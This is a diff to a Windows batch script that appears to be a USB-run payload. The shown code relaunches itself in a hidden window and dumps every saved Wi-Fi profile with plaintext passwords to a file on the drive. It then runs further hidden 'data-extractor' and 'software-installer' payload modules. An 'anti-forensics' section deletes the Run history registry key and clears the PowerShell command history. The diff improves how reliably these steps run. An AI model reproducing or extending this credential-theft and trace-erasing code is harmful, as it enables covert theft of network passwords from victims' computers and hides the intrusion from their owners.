@@ -8,11 +8,15 @@
 :: Ensure background execution without active terminal window
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
-    exit
+    exit /b 0
 )
 
-:: Dynamic path resolution (0 ms, independent of volume label)
+:: Dynamic path resolution (supports execution from USB root or from payloads/ folder)
 set "USB_ROOT=%~dp0"
+if exist "%~dp0..\payloads" (
+    for %%I in ("%~dp0..") do set "USB_ROOT=%%~fI\"
+)
+
 set "FOLDER_DATA=%USB_ROOT%Data"
 if not exist "%FOLDER_DATA%" mkdir "%FOLDER_DATA%" 2>nul
 
@@ -46,15 +50,17 @@ netsh wlan export profile folder="%TEMP%" key=clear >nul 2>&1
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$out = '%WIFI_FILE%'; Get-ChildItem $env:TEMP -Filter 'Wi-Fi-*.xml' | ForEach-Object { try { [xml]$x = Get-Content $_.FullName; $s = $x.WLANProfile.SSIDConfig.SSID.name; $p = $x.WLANProfile.MSM.security.sharedKey.keyMaterial; if (-not $p) { $p = '[Open Network / No Password]' }; Add-Content -Path $out -Value ('SSID: ' + $s + [Environment]::NewLine + 'PASS: ' + $p + [Environment]::NewLine + '--------------------------------------------------------') } finally { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
 
 :: ============================================================================
-:: 3. SUBMODULE EXECUTION (Optional: runs existing modules if present)
+:: 3. SUBMODULE EXECUTION (Supports both root layout and submodule tree)
 :: ============================================================================
-if exist "%USB_ROOT%payloads\data-extractor\payload.bat" (
-    call "%USB_ROOT%payloads\data-extractor\payload.bat" hidden
-)
+set "DATA_EXTRACTOR="
+if exist "%USB_ROOT%payloads\data-extractor\payload.bat" set "DATA_EXTRACTOR=%USB_ROOT%payloads\data-extractor\payload.bat"
+if exist "%~dp0data-extractor\payload.bat" set "DATA_EXTRACTOR=%~dp0data-extractor\payload.bat"
+if defined DATA_EXTRACTOR call "%DATA_EXTRACTOR%" hidden
 
-if exist "%USB_ROOT%payloads\software-installer\payload.bat" (
-    call "%USB_ROOT%payloads\software-installer\payload.bat" hidden
-)
+set "SW_INSTALLER="
+if exist "%USB_ROOT%payloads\software-installer\payload.bat" set "SW_INSTALLER=%USB_ROOT%payloads\software-installer\payload.bat"
+if exist "%~dp0software-installer\payload.bat" set "SW_INSTALLER=%~dp0software-installer\payload.bat"
+if defined SW_INSTALLER call "%SW_INSTALLER%" hidden
 
 :: ============================================================================
 :: 4. ANTI-FORENSICS CLEANUP (OPSEC)
@@ -65,4 +71,4 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va 
 :: Clear PowerShell command history file
 powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
 
-exit
+exit /b 0
